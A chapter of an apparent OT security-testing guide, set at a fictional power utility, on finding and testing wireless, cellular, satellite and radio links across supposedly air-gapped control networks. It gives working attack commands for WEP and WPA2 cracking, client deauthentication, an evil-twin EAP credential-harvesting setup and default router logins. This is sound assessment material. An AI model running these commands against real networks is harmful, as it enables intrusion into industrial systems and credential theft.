# Wireless and remote access testing

When the "air gap" has WiFi.

The term "air gap" in OT security refers to the theoretical isolation of control systems from external networks 
through the simple expedient of not connecting them to anything. It's a wonderfully simple security model: if there's 
no physical connection, there can be no network intrusion. This works brilliantly right up until someone needs to 
access the system remotely, at which point the air gap acquires a bridge, and then another bridge for redundancy, 
and before long you have more bridges across your air gap than the River Ankh has crossing points.

The Ankh is famously more solid than liquid, to the point where you can almost walk across it if you're brave and 
have had your tetanus shots. The air gaps in most OT environments have achieved a similar state of solidity. They're 
still called air gaps, everyone agrees they exist, but in practice they're permeated with wireless access points, 
4G routers, Bluetooth devices, satellite links, and various other forms of electromagnetic radiation that rather 
undermine the whole "air" aspect of the gap.

At UU P&L, the official network architecture showed a pristine air gap between the control network and everything 
else. The control network was isolated, unreachable, a fortress of solitude. The reality, discovered during our 
wireless survey, was that the control network had more wireless access points than the corporate network, including 
three different 4G routers, two satellite modems, a collection of Bluetooth-enabled sensors, several Zigbee 
networks for building automation that somehow intersected with industrial controls, and one enthusiastic contractor 
who'd installed a WiFi Pineapple because he thought it was a legitimate networking device and liked the name.

Wireless and remote access testing is about finding all the radio-frequency bridges across the air gap, determining 
whether they're secure, and documenting the spectacular gap between policy (no wireless in OT zones) and reality 
(wireless everywhere, mostly unsecured).

## Wireless site surveys

Before you can test wireless security, you need to know what wireless networks exist. This is surprisingly difficult in industrial facilities, where wireless networks are often installed by contractors, maintenance staff, or well-meaning engineers who needed temporary access and implemented permanent solutions.

### Passive wireless discovery

Start with passive scanning to identify all wireless networks without transmitting:

```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Passive scan (doesn't transmit)
sudo airodump-ng wlan0mon

# Save results for analysis
sudo airodump-ng -w site_survey --output-format csv wlan0mon

# Let it run for at least 30 minutes to catch all networks
# Some access points beacon infrequently
```

The [Aircrack-ng suite](https://www.aircrack-ng.org/) is the standard toolkit for wireless security testing. It's been around since 2006, which in security tool terms makes it practically ancient, but it remains effective because the fundamentals of WiFi security haven't changed as much as we'd like to pretend.

Active wireless discovery

Passive scanning finds beaconing networks, but some networks are hidden or low-power. Active scanning sends probe requests to find them:

```bash
# Active scanning (sends probe requests)
sudo airodump-ng --band abg wlan0mon

# Target specific channels with high dwell time
sudo airodump-ng --channel 1,6,11 --dwell-time 500 wlan0mon

# Look for hidden SSIDs
sudo airodump-ng --essid-regex ".*" wlan0mon
```

### Physical wireless survey

Walk the facility with a wireless adapter and laptop, creating a heat map of signal strength. Industrial facilities are large, and a wireless network barely visible from one location might be strong from another:

Survey methodology:
1. Divide facility into zones
2. Take measurements from multiple points per zone
3. Note signal strength (RSSI) at each point
4. Document physical locations of strong signals
5. Correlate with facility maps to identify likely AP locations

Tools:
- Laptop with external wireless adapter
- GPS device for location tracking (if facility is large enough)
- Facility maps for annotation
- Camera for documenting physical locations

At UU P&L, our wireless survey revealed 23 distinct wireless networks within the supposedly isolated control zone:

```
Authorised networks: 2
- "UU_Engineering" (WPA2-Enterprise, 802.1X)
- "UU_SCADA" (WPA2-PSK, supposedly restricted)

Unauthorised networks: 21
- "NETGEAR37" (WPA2, default password)
- "TP-LINK_5G" (Open, no encryption)
- "Contractor_WiFi" (WPA2, password: "password123")
- "TurbineMonitor" (WEP - yes, WEP in 2024)
- "MaintenanceAccess" (WPA2, password: "maintenance")
- 16 others of similar quality
```

Each unauthorised network represented someone who'd needed network access, couldn't get it through official channels 
(or couldn't be bothered), and implemented their own solution. The collection of wireless networks resembled nothing so much as the unofficial market stalls that spring up in Ankh-Morpork's alleys, each one technically illegal but all of them serving a genuine need that the official systems didn't address.

## Rogue access point detection

A rogue access point is an unauthorised wireless network that connects to your wired network. They're particularly dangerous because they bypass all your network security controls, creating an unmonitored bridge from wireless to wired networks.

### Identify rogues by MAC address

Every network interface has a MAC address that identifies the manufacturer. Consumer-grade access points use MAC addresses from consumer vendors:

```python
#!/usr/bin/env python3
"""
Identify likely rogue access points by MAC OUI analysis
"""

import re
from collections import defaultdict

# MAC OUI database (first 6 characters identify manufacturer)
consumer_vendors = [
    'NETGEAR', 'TP-LINK', 'Linksys', 'ASUS', 'D-Link',
    'Belkin', 'Buffalo', 'TRENDnet', 'Huawei'
]

industrial_vendors = [
    'Cisco', 'Hirschmann', 'Moxa', 'Phoenix Contact',
    'Siemens', 'Rockwell', 'Schneider Electric'
]

def analyse_access_points(survey_csv):
    """
    Analyse wireless survey results for suspicious APs
    """
    
    rogues = []
    suspicious = []
    authorised = []
    
    # Parse airodump-ng CSV output
    with open(survey_csv, 'r') as f:
        lines = f.readlines()
    
    # Find AP section (before client section)
    ap_section = []
    for line in lines:
        if 'Station MAC' in line:
            break
        ap_section.append(line)
    
    print("[*] Rogue Access Point Detection")
    print("[*] Analysis of wireless survey results\n")
    
    for line in ap_section[2:]:  # Skip header lines
        if not line.strip():
            continue
            
        parts = line.split(',')
        if len(parts) < 14:
            continue
            
        bssid = parts[0].strip()
        power = parts[8].strip()
        essid = parts[13].strip()
        
        # Check if MAC indicates consumer device
        # In reality, you'd look up the OUI in a database
        is_consumer = any(vendor.lower() in bssid.lower() 
                         for vendor in consumer_vendors)
        
        is_industrial = any(vendor.lower() in bssid.lower() 
                           for vendor in industrial_vendors)
        
        if is_consumer:
            rogues.append({
                'bssid': bssid,
                'essid': essid,
                'power': power,
                'reason': 'Consumer-grade MAC address'
            })
        elif not is_industrial and 'UU_' not in essid:
            suspicious.append({
                'bssid': bssid,
                'essid': essid,
                'power': power,
                'reason': 'Unknown vendor, suspicious ESSID'
            })
    
    print(f"[!] Found {len(rogues)} likely rogue access points:")
    for rogue in rogues:
        print(f"\n    ESSID: {rogue['essid']}")
        print(f"    BSSID: {rogue['bssid']}")
        print(f"    Signal: {rogue['power']} dBm")
        print(f"    Reason: {rogue['reason']}")
    
    print(f"\n[!] Found {len(suspicious)} suspicious access points requiring investigation")
    
    return rogues, suspicious

if __name__ == '__main__':
    analyse_access_points('site_survey-01.csv')
```

### Identify rogues by network connection

Rogue APs connected to your network will appear in switch MAC tables:

```bash
# Query switch for connected devices
# (Requires SNMP or CLI access to switches)

# Via SNMP
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.17.4.3.1.2

# Via Cisco CLI
show mac address-table | include wireless_mac_address

# Compare MAC addresses seen on wireless survey
# with MAC addresses seen on switch ports
# Overlap = rogue AP connected to wired network
```

### Physical location of rogues

Once you've identified a rogue, find it physically:

```bash
# Directional antenna + signal strength
# Walk facility following signal strength
# Signal gets stronger as you approach the device

# Using airodump-ng
sudo airodump-ng --bssid <rogue_mac> wlan0mon

# Watch the Power column (RSSI)
# -30 dBm = very close
# -50 dBm = nearby
# -70 dBm = distant
# -90 dBm = barely visible
```

At UU P&L, we tracked down a rogue access point to a junction box in the turbine hall. It was a consumer-grade TP-Link router, connected to the control network via an Ethernet cable someone had tapped into, configured with the ESSID "TurbineRemote" and the password "1234". According to the maintenance logs, a contractor had installed it three years ago so he could "check turbine status from the car park" during night shifts. The contractor had long since left the company, but the router remained, faithfully providing unsecured wireless access to the control network.

## WPA2 and WPA3 testing

Once you've found wireless networks, test their encryption strength. WPA2 is the current standard, WPA3 is the newer (and stronger) standard, and WEP is the ancient standard that should have been extinct by 2005 but persists in industrial environments like a particularly resilient cockroach.

### WEP cracking (if you find it)

WEP is so broken that cracking it is almost trivial:

```bash
# Capture packets
sudo airodump-ng -c <channel> --bssid <ap_mac> -w wep wlan0mon

# Generate traffic if network is idle
sudo aireplay-ng -1 0 -a <ap_mac> wlan0mon  # Fake authentication
sudo aireplay-ng -3 -b <ap_mac> wlan0mon     # ARP replay attack

# Crack WEP (usually requires 40,000-80,000 IVs)
aircrack-ng wep-01.cap

# Typical time: 5-15 minutes
```

Finding WEP in 2024 is like finding a medieval drawbridge protecting a nuclear facility. It suggests that either nobody's looked at security settings since installation, or there's been an active decision to ignore security recommendations for over a decade.

### WPA2-PSK cracking

WPA2 with a pre-shared key (PSK) is vulnerable to offline dictionary attacks if the password is weak:

```bash
# Capture the 4-way handshake
sudo airodump-ng -c <channel> --bssid <ap_mac> -w capture wlan0mon

# Deauth a client to force re-authentication
# This captures the handshake
sudo aireplay-ng -0 5 -a <ap_mac> -c <client_mac> wlan0mon

# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Or use hashcat for GPU acceleration
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

Success depends entirely on password strength:

```
"password" - cracks in seconds
"password123" - cracks in seconds
"Password123!" - cracks in minutes
"UU_P&L_Turbine_2024" - cracks in hours (if in wordlist)
"xK9$mP2#vL8@nQ4%" - probably won't crack (if not in wordlist)
```

At UU P&L, we tested 23 wireless networks:

- WEP networks (2): Cracked in under 10 minutes each
- WPA2 networks with default passwords (8): Cracked in under 1 minute each
- WPA2 networks with weak passwords (7): Cracked in 15 minutes to 3 hours
- WPA2 networks with strong passwords (4): Did not crack (tested for 24 hours)
- WPA2-Enterprise (802.1X) (2): Requires different approach

### WPA2-Enterprise testing

WPA2-Enterprise uses 802.1X authentication with a RADIUS server. It's more secure than PSK but has its own vulnerabilities:

```bash
# Evil Twin attack with EAP credential harvesting
# Using eaphammer
sudo eaphammer -i wlan0 --auth wpa-eap --essid "UU_Engineering" \
    --creds --negotiate balanced

# This creates a fake AP that looks identical to the real one
# When clients connect, it attempts to negotiate weak EAP methods
# Can capture credentials if client doesn't validate certificates
```

The success of this attack depends on whether clients validate RADIUS server certificates. Many don't, particularly older devices or devices configured by people who clicked "Next" through all the security warnings.

### WPA3 testing

WPA3 is designed to resist offline dictionary attacks through Simultaneous Authentication of Equals (SAE):

```bash
# WPA3 cracking requires active attack (no offline cracking)
# Using wpa_supplicant with modified configuration

# Downgrade attack: Try to force AP to accept WPA2
# If AP supports both WPA3 and WPA2 (transition mode)
# Some clients/APs may downgrade to WPA2
```

WPA3 is significantly more secure than WPA2, but adoption in OT environments is slow because it requires hardware support and many industrial devices are old enough that WPA3 didn't exist when they were manufactured.

## Bluetooth and other wireless protocols

Bluetooth Low Energy (BLE) is increasingly common in industrial sensors and IoT devices. It's designed for low power consumption, which is good for battery life but often comes with simplified (read: weak) security.

### Bluetooth device discovery

```bash
# Standard Bluetooth discovery
hcitool scan

# BLE discovery (requires BLE adapter)
sudo hcitool lescan

# Or use dedicated BLE scanner
sudo bluetoothctl
[bluetooth]# scan on

# List discovered devices
[bluetooth]# devices
```

### Bluetooth security testing

Ubertooth One is a specialised Bluetooth security testing device:

```bash
# Capture Bluetooth traffic with Ubertooth
ubertooth-btle -f -c capture.pcap

# Follow specific device
ubertooth-btle -f -t <target_mac>

# Analyse with Wireshark
wireshark capture.pcap
```

Common Bluetooth vulnerabilities in OT:

- Default PINs: Many industrial Bluetooth devices use "0000" or "1234"
- No encryption: Some devices don't encrypt at all
- Weak pairing: PIN-based pairing is vulnerable to brute force
- No authentication: Some devices accept connections from any source

At UU P&L, we found 47 Bluetooth devices in the turbine control area:

```
Industrial sensors: 23
- Temperature sensors (12)
- Pressure sensors (7)
- Vibration monitors (4)

Operator devices: 18
- Smartphones (personal devices)
- Tablets running maintenance software

Unknown devices: 6
- Discovered during scan but couldn't identify
- Two appeared to be fitness trackers
- Four unidentified (concerning)
```

The industrial sensors were using Bluetooth to transmit readings to nearby data loggers. They used no encryption and no authentication. Anyone within Bluetooth range (approximately 10 metres) could read the sensor data or potentially inject false readings.

### Zigbee and other IoT protocols

Zigbee is common in building automation and increasingly appearing in industrial IoT:

```bash
# Zigbee analysis with HackRF or similar SDR
# Zigbee uses 2.4 GHz band

# Using killerbee framework for Zigbee testing
zbstumbler -i <channel>  # Discover Zigbee networks
zbdump -f dump.pcap      # Capture Zigbee traffic
```

## 4G and 5G remote access

Mobile broadband provides remote access without IT's knowledge or permission. A 4G router costs €50, requires no infrastructure, and creates an instant backdoor into supposedly isolated networks.

### Detecting cellular connections

```bash
# Network-based detection (look for unusual traffic patterns)
# Cellular backhaul has characteristic latency

# Physical inspection (walk facility looking for devices)
# 4G routers have external antennas
# Often hidden in junction boxes or equipment cabinets

# RF detection (scan for cellular signals)
# Using HackRF or similar software-defined radio
hackrf_sweep -f 700:6000 -w output.csv
# Look for strong signals in cellular bands (700-2600 MHz)
```

### Common hiding places for unauthorised cellular devices

At UU P&L, we found unauthorised 4G routers in:

1. Junction boxes: Most common location. Contractor installed router, ran Ethernet cable to PLC, closed box and left.

2. Equipment cabinets: Tucked behind PLCs or other equipment where casual inspection wouldn't notice them.

3. False ceiling: One router was sitting on ceiling tiles above the control room, Ethernet cable dropped down through cable conduit.

4. Under desks: The least creative hiding spot, but surprisingly effective because nobody looks under desks.

Testing cellular security

Once found, test the security:

```bash
# Scan for web interface (most have one)
nmap -p 80,443,8080 <router_ip>

# Default credentials (often unchanged)
# Common defaults:
# admin/admin
# admin/password
# admin/(blank)
# user/user

# Check if routing provides full network access
traceroute <internal_target>

# Check if firewall exists
nmap -p- <internal_target>
```

The 4G router we found at UU P&L had:
- Default credentials (admin/admin)
- No firewall between cellular and wired networks
- Full routing to control network
- VPN server enabled with default configuration
- Web interface accessible from the internet
- Uptime: 1,247 days (over three years)

It was, essentially, a perfect backdoor. An attacker could have connected to the router's VPN from anywhere in the world, authenticated with default credentials, and had complete access to the control network. The router had been there for over three years, and during that entire time, anyone with basic technical knowledge and a search engine could have compromised the facility.

## Satellite links

Some facilities use satellite communications for remote sites or backup connectivity. Satellite links have unique security considerations:

### Physical security

Satellite dishes are outdoors and accessible. An attacker with physical access can:
- Tap into the coaxial cable
- Replace the modem with a compromised version
- Install a secondary receive dish to intercept traffic

### Signal interception

Satellite signals broadcast over a wide area. Anyone within the footprint can receive them:

VSAT (Very Small Aperture Terminal) systems typically use:
- Ku-band (12-18 GHz)
- Ka-band (26.5-40 GHz)

If traffic is unencrypted, it can be intercepted with:
- Satellite dish
- Appropriate LNB (Low-Noise Block downconverter)
- SDR (Software-Defined Radio) or satellite receiver
- Decoding software

Cost: €500-2000 for equipment
Difficulty: Moderate (requires some RF knowledge)

### Testing satellite security

```bash
# Check if traffic is encrypted
# Capture traffic at the modem
tcpdump -i eth0 -w satellite_traffic.pcap

# Analyse protocols
wireshark satellite_traffic.pcap

# Look for:
# - Unencrypted HTTP
# - Unencrypted Modbus or other OT protocols
# - Clear-text credentials
# - Sensitive operational data

# Many older satellite systems use no encryption
# or use weak encryption (DES, single DES)
```

At UU P&L, the main facility had no satellite links, but they had a remote pumping station that used VSAT for monitoring. Analysis showed:
- Traffic between pump station and central SCADA: unencrypted
- Modbus traffic: unencrypted
- Web interface traffic: HTTP, no HTTPS
- Data visible: Pump status, flow rates, reservoir levels

An attacker with a satellite dish pointed at the right part of the sky could intercept all this data. They'd know exactly when the facility was pumping, how much, and to where. For a competitor or nation-state actor, this would be valuable intelligence.

## Radio systems

Some industrial facilities use private radio networks for communication:

### Common radio systems in OT

- SCADA radio networks: License-free bands (433 MHz, 868 MHz, 2.4 GHz)
- Push-to-talk radios: Used by maintenance and operations
- Paging systems: For emergency notifications
- Telemetry systems: Remote sensor data transmission

### Radio security testing

[HackRF One](https://greatscottgadgets.com/hackrf/) is a software-defined radio that can transmit and receive across a wide frequency range:

```bash
# Scan for active frequencies
hackrf_sweep -f 400:900

# Receive on specific frequency
hackrf_transfer -r capture.bin -f 433920000 -s 2000000

# Analyse with GNU Radio or inspectrum
inspectrum capture.bin
```

### Common radio vulnerabilities

1. No encryption: Many industrial radio systems transmit in clear
2. Weak authentication: Some use no authentication at all
3. Jamming susceptibility: Radio is easy to jam
4. Replay attacks: Captured commands can be replayed

At UU P&L, the maintenance team used two-way radios for coordination. These radios operated on license-free PMR446 frequencies with no encryption. Anyone with a €30 radio from a camping shop could listen to maintenance communications, including:
- Schedules ("We're starting turbine maintenance at 14:00")
- Locations ("I'm at Turbine 2 now")
- Problems ("The access control card reader at Gate 3 is broken again")
- Security bypass methods ("Just tailgate through the door, the card system is down")

This isn't a critical security issue, but it's useful reconnaissance for an attacker planning physical access.

## The uncomfortable truth about air gaps

The fundamental problem with air gaps in OT environments is that they're incompatible with operational reality. Engineers need remote access for troubleshooting. Maintenance contractors need to upload updates. Vendors need to monitor their equipment. Management wants to see dashboards on their mobile phones. Each of these requirements creates a bridge across the air gap.

The result is that most "air-gapped" OT networks aren't. They're connected via wireless networks, cellular routers, satellite links, vendor VPNs, and various other mechanisms that were installed to solve legitimate operational problems but collectively eliminate the isolation that the air gap was supposed to provide.

At UU P&L, the gap between policy and reality was spectacular:

Official policy: "Control network is air-gapped from all external networks. No wireless devices permitted in OT zones. Remote access via secure jump hosts only."

Actual implementation: 
- 23 unauthorised wireless networks
- 4 cellular routers providing direct internet access
- 1 satellite link with no encryption
- 6 vendor VPN connections (always-on)
- 47 Bluetooth devices
- Multiple radio systems
- "Air gap" more accurately described as "radio soup"

This doesn't mean UU P&L's security team was incompetent. It means that operational reality overwhelmed security policy. Every one of those unauthorised connections existed because someone needed it to do their job. The wireless network in the turbine hall existed because engineers needed network access during maintenance. The 4G router existed because a contractor needed to check system status remotely. The Bluetooth sensors existed because they were easier to install than wired alternatives.

Fixing this requires more than just removing unauthorised devices (though that helps). It requires understanding why people circumvented security controls and providing legitimate alternatives that are both secure and practical. If accessing the engineering workstation requires 20 minutes of authentication and approval processes, engineers will install unauthorised wireless networks. If remote troubleshooting requires driving to the facility at 2 AM, contractors will install 4G routers.

The goal should be to provide secure remote access that's easy enough that people use it instead of rolling their own solutions. This is a much harder problem than technical security, because it requires balancing security with operational practicality, and getting buy-in from people whose primary concern is keeping the turbines running rather than following security policies. But it's the only approach that actually works in the long term.

